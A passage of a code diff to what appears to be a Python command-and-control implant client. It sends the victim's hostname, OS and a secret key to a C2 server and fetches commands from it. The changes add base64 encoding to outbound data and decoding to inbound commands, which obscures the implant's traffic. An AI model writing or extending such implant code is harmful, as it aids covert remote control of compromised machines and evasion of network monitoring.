@@ -17,6 +17,7 @@ from datetime import datetime
 from platform import node, system, release
 from threading import Thread
 from struct import unpack
+from base64 import b64decode, b64encode
 
 ################################################
 # Client Config - Verify with C2 Server config
@@ -33,6 +34,10 @@ KILL_DATE       = datetime(2020,6,11)
 ################################################
 # Client Request to C2
 ################################################
+def cmd_formatter(send_data):
+    # Put data in proper base64 format (really confusing)
+    return b64encode(send_data.encode('utf-8')).decode('utf-8')
+
 def request_headers(send_data):
     # Create HTTP(S) request headers
     data = "GET {0} HTTP/1.0\r\n".format(AGENT_PAGE)
@@ -41,7 +46,7 @@ def request_headers(send_data):
     data += "Secret-Key: {}\r\n".format(SECRET_KEY)
     data += "Hostname: {}\r\n".format(HOSTNAME)
     data += "OS: {}\r\n".format(OS_VERSION)
-    data += "Data: {}\r\n\r\n".format(send_data)
+    data += "Data: {}\r\n\r\n".format(cmd_formatter(send_data))
     return data
 
 def http_request(send_data):
@@ -94,8 +99,9 @@ def parse_response(data):
     if "-debug" in argv: print("\n[*] Rcv Data: {}".format(data))
     # Parse data returned from C2 looking for cmd
     cmd = data.split('<body>')[1].split('</body>')[0].strip()
-    if not cmd: return False
-    return cmd
+    if not cmd:
+        return False
+    return b64decode(cmd).decode('utf-8')
 
 ################################################
 # Command Handler
